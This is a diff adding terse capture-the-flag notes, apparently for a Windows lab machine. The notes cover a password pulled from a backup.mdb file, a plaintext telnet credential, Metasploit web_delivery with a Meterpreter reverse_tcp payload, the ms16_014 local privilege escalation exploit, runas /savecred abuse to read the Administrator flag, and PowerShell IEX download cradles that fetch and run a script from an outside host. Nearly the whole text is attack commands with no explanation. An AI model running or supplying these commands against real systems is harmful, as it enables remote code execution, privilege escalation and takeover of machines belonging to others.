@@ -1,0 +1,37 @@
+first find the zip file pwd 
+
+pwd is in the strings backup.mdb | less 
+
+telnet password
+
+security 
+4Cc3ssC0ntr0ller
+
+
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.6
+exploit
+
+use post/multi/recon/local_exploit_suggester
+
+	
+use exploit/windows/local/ms16_014_wmi_recv_notif
+set lhost 10.10.14.6
+set session 1
+set lport 1234
+exploit
+
+mdb-export backup.mdb auth_user
+
+C:\Windows\System32\runas.exe /env /user:Administrator /savecred "cmd /k more c:\Administrator\Desktop\root.txt > t.txt
+
+C:\Windows\System32\runas.exe /env /user:Administrator /savecred "cmd /k type c:\Administrator\Desktop\root.txt > t1.txt
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.12.140:8000/1.ps1','1.ps1')"
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.12.140:8000/1.ps1')"
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.12.140:8000/1.ps1','1.ps1')
+
+C:\Windows\System32\runas.exe /env /user:Administrator /savecred "cmd /k file.exe"
